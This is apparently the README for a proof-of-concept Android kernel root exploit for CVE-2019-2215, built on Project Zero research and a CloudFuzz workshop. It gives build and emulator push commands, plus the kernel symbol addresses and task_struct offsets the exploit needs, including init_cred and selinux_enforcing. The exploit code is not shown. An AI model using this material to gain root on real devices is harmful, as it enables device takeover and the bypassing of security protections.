## Credits
Based on a [proof-of-concept](https://bugs.chromium.org/p/project-zero/issues/detail?id=1942) by Jann Horn & Maddie Stone of Google Project Zero

Special thanks to [CloudFuzz's workshop](https://cloudfuzz.github.io/android-kernel-exploitation/) for making it possible for me to write this exploit.

## Usage
To build the exploit:

    NDK_ROOT=~/Android/Sdk/ndk/22.0.7026061 make

To build the exploit and upload it to a running device (using android studio emulator):

    NDK_ROOT=~/Android/Sdk/ndk/22.0.7026061 make build-exploit push-exploit

Example usage:

    mohamed@mohamed-G5-5590:~/Desktop/android/CVE-2019-2215$ NDK_ROOT=~/Android/Sdk/ndk/22.0.7026061 make build-exploit push-exploit

# Build Notes
Some constants in `exploit.h` are build-specific, namely:

    // System.map
    // ffffffff80200000 T _stext
    // ffffffff81433ac0 D init_nsproxy
    // ffffffff816acfe8 B selinux_enforcing
    // ffffffff81433c30 D init_cred

    #define KERNEL_BASE         0xffffffff80200000ul
    #define INIT_NSPROXY        0xffffffff81433ac0ul
    #define SELINUX_ENFORCING   0xffffffff816acfe8ul
    #define INIT_CRED           0xffffffff81433c30ul

AND

    // Variable offsets
    // macro define offsetof(_type, _memb) ((long)(&((_type *)0)->_memb))
    #define ADDR_LIMIT_OFFSET   0xa18ul // p /x (long)offsetof(struct task_struct, thread) + (long)offsetof(struct thread_struct, addr_limit)
    #define PID_OFFSET          0x4e8ul // p /x offsetof(struct task_struct, pid)
    #define NSPROXY_OFFSET      0x6c0ul // p /x offsetof(struct task_struct, nsproxy)
    #define REAL_CRED_OFFSET    0x680ul // p /x offsetof(struct task_struct, real_cred)

The first set of constants can be retrieved from the `System.map` file of the target build, and the second set of constants can be calculated using their respective gdb commands.
